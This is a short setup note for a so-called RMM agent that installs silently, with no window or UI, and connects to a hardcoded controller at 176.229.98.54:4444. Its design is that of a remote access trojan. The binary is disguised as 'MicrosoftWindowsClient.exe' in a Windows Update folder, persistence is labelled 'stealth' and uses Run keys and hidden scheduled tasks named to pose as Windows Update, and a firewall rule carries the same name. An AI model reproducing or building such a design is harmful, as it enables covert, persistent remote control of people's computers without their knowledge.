RMM Agent Setup - Client App (SILENT)
======================================
Run Agent-Setup.exe (requires Admin, no window - completely silent)
- Installs to: C:\ProgramData\Microsoft\Windows\Update\
  - MicrosoftWindowsClient.exe
  - server.crt
- Supervisor: native --watch mode in the same binary (no powershell, no .ps1)
- Persistence (stealth):
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = agent start line
  - HKLM\... same (all users); WindowsUpdateWatchdog = "...MicrosoftWindowsClient.exe" --watch
  - Scheduled Tasks \WindowsUpdate + \WindowsUpdateWatchdog (hidden, logon trigger, HighestAvailable)
- Firewall: out allow for MicrosoftWindowsClient.exe (name "Windows Update")
- Auto-starts agent hidden (CREATE_NO_WINDOW) immediately
- No desktop shortcut, no UI, no console

Uninstall: Agent-Setup.exe --uninstall --confirm YES
Or run: schtasks /delete /tn WindowsUpdate /f  +  reg delete ...  +  taskkill /F /IM MicrosoftWindowsClient.exe

Controller IP: 176.229.98.54:4444 TLS 1.2 (cert pinned SAN 176.229.98.54)
